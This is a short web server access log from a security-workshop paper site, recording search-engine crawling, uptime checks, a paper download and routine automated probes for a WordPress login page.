197.86.143.193 - - [29/Apr/2018:15:24:23 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [29/Apr/2018:15:24:31 -0400] "GET /papers/1993/nspw1993-meadows.pdf HTTP/1.1" 200 322223 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.211.107.137 - - [29/Apr/2018:15:25:48 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [29/Apr/2018:15:26:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
103.211.107.137 - - [29/Apr/2018:15:26:50 -0400] "GET /wp-login.php HTTP/1.1" 404 4701 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
94.206.176.243 - - [29/Apr/2018:15:27:42 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 200 179849 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
94.206.176.243 - - [29/Apr/2018:15:27:45 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 206 179900 "https://www.nspw.org/papers/2007/nspw2007-somayaji.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
94.206.176.243 - - [29/Apr/2018:15:27:46 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 206 4297 "https://www.nspw.org/papers/2007/nspw2007-somayaji.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
94.206.176.243 - - [29/Apr/2018:15:27:47 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 206 4503 "https://www.nspw.org/papers/2007/nspw2007-somayaji.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
94.206.176.243 - - [29/Apr/2018:15:27:47 -0400] "GET /papers/2007/nspw2007-somayaji.pdf HTTP/1.1" 206 135808 "https://www.nspw.org/papers/2007/nspw2007-somayaji.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
66.249.73.91 - - [29/Apr/2018:15:27:58 -0400] "GET /papers/2011/nspw2011-bishop.pdf HTTP/1.1" 200 572715 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [29/Apr/2018:15:29:40 -0400] "GET / HTTP/1.1" 200 6606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [29/Apr/2018:15:31:05 -0400] "GET /current/oc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [29/Apr/2018:15:31:19 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [29/Apr/2018:15:31:24 -0400] "GET /papers/1993/nspw1993-strens.pdf HTTP/1.1" 200 721049 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
203.192.233.23 - - [29/Apr/2018:15:32:20 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
203.192.233.23 - - [29/Apr/2018:15:32:23 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [29/Apr/2018:15:33:07 -0400] "GET /papers/1993/nspw1993-lapadula-2.pdf HTTP/1.1" 200 611628 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
104.129.18.144 - - [29/Apr/2018:15:34:23 -0400] "GET / HTTP/1.1" 200 11592 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
141.212.122.128 - - [29/Apr/2018:15:34:27 -0400] "GET / HTTP/1.1" 200 6383 "http://134.117.225.39:80/" "Mozilla/5.0 zgrab/0.x"
